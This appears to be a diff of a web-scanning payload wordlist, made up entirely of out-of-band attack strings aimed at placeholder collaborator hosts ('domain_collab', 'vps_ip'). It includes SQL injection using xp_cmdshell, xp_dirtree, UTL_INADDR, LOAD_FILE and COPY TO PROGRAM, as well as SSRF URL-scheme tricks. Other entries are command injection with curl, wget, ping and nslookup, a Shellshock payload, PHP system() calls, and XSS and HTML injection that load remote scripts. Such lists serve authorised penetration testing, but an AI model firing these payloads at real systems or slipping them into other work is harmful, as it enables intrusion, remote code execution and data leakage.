-` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-mailto://0://srff2.domain_collab;http://google.com:80/
-mailto://domain_collab
-mailto://ssrf1.domain_collab$google.com
-mailto://vps_ip
-mailto://vps_ip:80
-"><meta http-equiv="refresh" content='0;URL=ftp://domain_collab?a=
-"><meta http-equiv="refresh" content='0; url=http://domain_collab/log.php?text=
-\n\033[2curl http://vps_ip:80/.testing/term_escape.txt?vuln=1?user=\`whoami\`
-\n\033[2curl http://vps_ip/.testing/term_escape.txt?vuln=1?user=\`whoami\`
-\n\033[2wget http://vps_ip:80/.testing/term_escape.txt?vuln=2?user=\`whoami\`
-\n\033[2wget http://vps_ip/.testing/term_escape.txt?vuln=2?user=\`whoami\`
-\necho INJECTX\nexit\n\033[2Acurl https://domain_collab/.testing/rce_vuln.txt\n
-\necho INJECTX\nexit\n\033[2Awget https://domain_collab/.testing/rce_vuln.txt\n
-"><noscript><form action=http://domain_collab><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
-ogg://0://srff2.domain_collab;http://google.com:80/
-ogg://domain_collab
-ogg://ssrf1.domain_collab$google.com
-ogg://vps_ip
-ogg://vps_ip:80
-" OR copy (SELECT '') to program 'nslookup domain_collab'--
-" OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-") OR copy (SELECT '') to program 'nslookup domain_collab'--
-") OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) OR copy (SELECT '') to program 'nslookup domain_collab'--
-")) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-' OR copy (SELECT '') to program 'nslookup domain_collab'--
-' OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-') OR copy (SELECT '') to program 'nslookup domain_collab'--
-') OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-')) OR copy (SELECT '') to program 'nslookup domain_collab'--
-')) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-` OR copy (SELECT '') to program 'nslookup domain_collab'--
-` OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-`) OR copy (SELECT '') to program 'nslookup domain_collab'--
-`) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-`)) OR copy (SELECT '') to program 'nslookup domain_collab'--
-`)) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-OR copy (SELECT '') to program 'nslookup domain_collab'--
-OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-" OR exec master..xp_dirtree '//domain_collab/a'--
-" OR exec master..xp_dirtree '//domain_collab/a'-- 
-") OR exec master..xp_dirtree '//domain_collab/a'--
-") OR exec master..xp_dirtree '//domain_collab/a'-- 
-")) OR exec master..xp_dirtree '//domain_collab/a'--
-")) OR exec master..xp_dirtree '//domain_collab/a'-- 
-' OR exec master..xp_dirtree '//domain_collab/a'--
-' OR exec master..xp_dirtree '//domain_collab/a'-- 
-') OR exec master..xp_dirtree '//domain_collab/a'--
-') OR exec master..xp_dirtree '//domain_collab/a'-- 
-')) OR exec master..xp_dirtree '//domain_collab/a'--
-')) OR exec master..xp_dirtree '//domain_collab/a'-- 
-` OR exec master..xp_dirtree '//domain_collab/a'--
-` OR exec master..xp_dirtree '//domain_collab/a'-- 
-`) OR exec master..xp_dirtree '//domain_collab/a'--
-`) OR exec master..xp_dirtree '//domain_collab/a'-- 
-`)) OR exec master..xp_dirtree '//domain_collab/a'--
-`)) OR exec master..xp_dirtree '//domain_collab/a'-- 
-OR exec master..xp_dirtree '//domain_collab/a'--
-OR exec master..xp_dirtree '//domain_collab/a'-- 
-" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
-OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'-- 
-" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-" OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-" OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-") OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-")) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-' OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-' OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-') OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-') OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-')) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-')) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-` OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-` OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-`) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-OR SELECT UTL_INADDR.get_host_address('domain_collab')--
-OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-phar://0://srff2.domain_collab;http://google.com:80/
-phar://domain_collab
-phar://ssrf1.domain_collab$google.com
-phar://vps_ip
 phar://vps_ip:80
-<?php system("curl https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("curl https://domain_collab/.testing/rce_vuln.txt?req=df2fkjj");?>
-<?php system("wget https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("wget https://domain_collab/.testing/rce_vuln.txt?retepq=jdfj2jc");?>
+sftp://vps_ip:80
+ssh2://vps_ip:80
+tftp://vps_ip:80
+zlib://vps_ip:80
+%23.domain_collab
+%3F.domain_collab
+\\vps_ip:80\share
+\\domain_collab\c$
+\\domain_collab\C$
+expect://vps_ip:80
+gopher://vps_ip:80
+mailto://vps_ip:80
+telnet://vps_ip:80
+ftp://domain_collab
+jar://domain_collab
+ogg://domain_collab
+rar://domain_collab
+zip://domain_collab
+%2f%2f.domain_collab
+%5c%5c.domain_collab
+data://domain_collab
+dict://domain_collab
+file://domain_collab
+glob://domain_collab
+http://domain_collab
+ldap://domain_collab
+phar://domain_collab
+`ping domain_collab`
+sftp://domain_collab
+ssh2://domain_collab
+tftp://domain_collab
+zlib://domain_collab
+ ;curl domain_collab"
+ |curl domain_collab"
+\\domain_collab\share
+https://domain_collab
+ ;ping domain_collab"
+ |ping domain_collab"
 & ping -i 30 vps_ip &
 & ping -n 30 vps_ip &
-`ping vps_ip`
-"><portal src='https://domain_collab?
-rar://0://srff2.domain_collab;http://google.com:80/
-rar://domain_collab
-rar://ssrf1.domain_collab$google.com
-rar://vps_ip
-rar://vps_ip:80
-<script>$.getScript("//domain_collab")</script>
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//domain_collab");a.send();</script>
-"><script src=https://domain_collab></script>
-"><script src='/search?q=a&call=alert(1)'></script>
-" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-SELECT ... INTO OUTFILE '\\\\domain_collab\a'
-" SELECT UTL_INADDR.get_host_address('domain_collab')--
-" SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") SELECT UTL_INADDR.get_host_address('domain_collab')--
-") SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) SELECT UTL_INADDR.get_host_address('domain_collab')--
-")) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-"; SELECT UTL_INADDR.get_host_address('domain_collab')--
-"; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-"||SELECT UTL_INADDR.get_host_address('domain_collab')--
-"||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-') SELECT UTL_INADDR.get_host_address('domain_collab')--
-') SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-')) SELECT UTL_INADDR.get_host_address('domain_collab')--
-')) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-'; SELECT UTL_INADDR.get_host_address('domain_collab')--
-'; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-'||SELECT UTL_INADDR.get_host_address('domain_collab')--
-'||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-` SELECT UTL_INADDR.get_host_address('domain_collab')--
-` SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`) SELECT UTL_INADDR.get_host_address('domain_collab')--
-`) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`)) SELECT UTL_INADDR.get_host_address('domain_collab')--
-`)) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`; SELECT UTL_INADDR.get_host_address('domain_collab')--
-`; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`||SELECT UTL_INADDR.get_host_address('domain_collab')--
-`||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-sftp://0://srff2.domain_collab;http://google.com:80/
-sftp://ssrf1.domain_collab$google.com
-sftp://vps_ip:80
-ssh2://0://srff2.domain_collab;http://google.com:80/
-ssh2://domain_collab
-ssh2://ssrf1.domain_collab$google.com
-ssh2://vps_ip
-ssh2://vps_ip:80
-###SSRF
-//ssrf1.domain_collab$google.com
-\ssrf1.domain_collab$google.com
-\\ssrf.domain_collab\c$
-\\ssrf.domain_collab\share
-& system('curl https://domain_collab/.testing/rce_vuln.txt');
-&& system('curl https://domain_collab/.testing/rce_vuln.txt');
-; system('curl https://domain_collab/.testing/rce_vuln.txt');
-| system('curl https://domain_collab/.testing/rce_vuln.txt');
-|| system('curl https://domain_collab/.testing/rce_vuln.txt');
-system('curl https://domain_collab/.testing/rce_vuln.txt')
-system('curl https://domain_collab/.testing/rce_vuln.txt');
-system('curl https://domain_collab/.testing/rce_vuln.txt?req=22fd2wdf')
-system('wget https://domain_collab/.testing/rce_vuln.txt');
-system('wget https://domain_collab/.testing/rce_vuln.txt?req=22fd2w23')
-"><table background='//domain_collab?'
-telnet://0://srff2.domain_collab;http://google.com:80/
+telnet://vps_ip:80 80
+ `curl domain_collab`"
+ ||curl domain_collab"
+expect://domain_collab
+gopher://domain_collab
+mailto://domain_collab
+ ||ping domain_collab"
 telnet://domain_collab
-telnet://ssrf1.domain_collab$google.com
-telnet://vps_ip
-telnet://vps_ip 80
-telnet://vps_ip:80
-t'exec master..xp_cmdshell 'nslookup domain_collab'--
-tftp://0://srff2.domain_collab;http://google.com:80/
-tftp://domain_collab
-tftp://ssrf1.domain_collab$google.com
-tftp://vps_ip
-tftp://vps_ip:80
-"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
-`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-"UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
-"UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-'UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
-'UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-`UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
-`UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://vps_ip:80/.testing/shellshock.txt?vuln=13;curl http://vps_ip:80/.testing/shellshock.txt?vuln=15;\");'
-() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://vps_ip/.testing/shellshock.txt?vuln=13;curl http://vps_ip/.testing/shellshock.txt?vuln=15;\");'
-||UTL_HTTP.request('http://domain_collab/')%20--%20
-//vps_ip
-\\vps_ip
-vps_ip
-//vps_ip:80
-\\vps_ip:80
-\vps_ip:80
-vps_ip:80
-\\vps_ip:80\C$
-\\vps_ip\C$
+ $(curl domain_collab)"
+ %0acurl domain_collab"
+"><img src='//vps_ip:80?
+%0a ping -i 30 vps_ip %0a
+"><img src='//vps_ip:80? 
+ ;nslookup domain_collab"
+ ;ping -c2 domain_collab"
+ |ping -c2 domain_collab"
+telnet://domain_collab 80
+'\"><img src=//vps_ip:80/>
+  |nslookup domain_collab"
+ ||nslookup domain_collab"
+ ;ping -c 2 domain_collab"
+ `ping -c2 domain_collab`"
+ ||ping -c2 domain_collab"
+ |ping -c 2 domain_collab"
+ \u0026curl domain_collab"
+ \u0026ping domain_collab"
+ $(ping -c2 domain_collab)"
+ %0aping -c2 domain_collab"
+ `ping -c 2 domain_collab`"
+ ||ping -c 2 domain_collab"
+ $(ping -c 2 domain_collab)"
+ %0aping -c 2 domain_collab"
+"><img src='//domain_collab?
+& ping -i 30 domain_collab &
+& ping -n 30 domain_collab &
+"><img src='//domain_collab? 
+LOAD_FILE('\\\\vps_ip:80\\a')
+ ;p\"i\"n\"g\" domain_collab"
+ |p\"i\"n\"g\" domain_collab"
+'\"><img src=//domain_collab/>
+ ||p\"i\"n\"g\" domain_collab"
+ \u0026nslookup domain_collab"
+ \u0026ping -c2 domain_collab"
+ \u0026ping -c 2 domain_collab"
+%0a ping -i 30 domain_collab %0a
+ \u0026\u0026curl domain_collab"
+ \u0026\u0026ping domain_collab"
+\0://vps_ip:80;http://google.com/
+"><base href='http://vps_ip:80/'>
+LOAD_FILE('\\\\domain_collab\\a')
+//0://vps_ip:80;http://google.com/
+"><table background='//vps_ip:80?'
+ \u0026p\"i\"n\"g\" domain_collab"
+'\"><img src=//vps_ip:80/oobxss.js>
+ \u0026\u0026nslookup domain_collab"
+ \u0026\u0026ping -c2 domain_collab"
+\0://domain_collab;http://google.com/
+"><base href='http://domain_collab/'>
+"><portal src='https://domain_collab?
+ \u0026\u0026ping -c 2 domain_collab"
+//0://domain_collab;http://google.com/
+<esi:include src="http://vps_ip:80/"/>
+exec master..xp_cmdshell 'ping+vps_ip'
+ftp://0://vps_ip:80;http://google.com/
+jar://0://vps_ip:80;http://google.com/
+ogg://0://vps_ip:80;http://google.com/
+rar://0://vps_ip:80;http://google.com/
+"><table background='//domain_collab?'
+zip://0://vps_ip:80;http://google.com/
+data://0://vps_ip:80;http://google.com/
+dict://0://vps_ip:80;http://google.com/
+file://0://vps_ip:80;http://google.com/
+glob://0://vps_ip:80;http://google.com/
+http://0://vps_ip:80;http://google.com/
+'\"><img src=//domain_collab/oobxss.js>
+ldap://0://vps_ip:80;http://google.com/
+phar://0://vps_ip:80;http://google.com/
+sftp://0://vps_ip:80;http://google.com/
+ssh2://0://vps_ip:80;http://google.com/
+tftp://0://vps_ip:80;http://google.com/
+zlib://0://vps_ip:80;http://google.com/
+& curl http://vps_ip:80/.testing/rce.txt
+| curl http://vps_ip:80/.testing/rce.txt
+ \u0026\u0026p\"i\"n\"g\" domain_collab"
+& wget http://vps_ip:80/.testing/rce.txt
+| wget http://vps_ip:80/.testing/rce.txt
+expect://0://vps_ip:80;http://google.com/
+//google.com+&@google.com#+@or.vps_ip:80/
+gopher://0://vps_ip:80;http://google.com/
+mailto://0://vps_ip:80;http://google.com/
+ ;n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
+ |n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
+SELECT ... INTO OUTFILE '\\\\vps_ip:80\a'
+telnet://0://vps_ip:80;http://google.com/
+<esi:include src="http://domain_collab/"/>
+; exec master..xp_cmdshell 'ping vps_ip'--
+ftp://0://domain_collab;http://google.com/
+"><img src='http://vps_ip:80/log.php?HTML=
+jar://0://domain_collab;http://google.com/
+ ||n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
+ogg://0://domain_collab;http://google.com/
+rar://0://domain_collab;http://google.com/
+zip://0://domain_collab;http://google.com/
+curl http://vps_ip:80/.testing/rce_vuln.txt
+data://0://domain_collab;http://google.com/
+dict://0://domain_collab;http://google.com/
+exec%20master..xp_dirtree%20'//vps_ip:80/a'
+'; exec master..xp_cmdshell 'ping vps_ip'--
+" exec master..xp_dirtree '//vps_ip:80/a'--
+' exec master..xp_dirtree '//vps_ip:80/a'--
+` exec master..xp_dirtree '//vps_ip:80/a'--
+file://0://domain_collab;http://google.com/
+glob://0://domain_collab;http://google.com/
+http://0://domain_collab;http://google.com/
+ldap://0://domain_collab;http://google.com/
+phar://0://domain_collab;http://google.com/
+<script>$.getScript("//vps_ip:80")</script>
+sftp://0://domain_collab;http://google.com/
+ssh2://0://domain_collab;http://google.com/
+tftp://0://domain_collab;http://google.com/
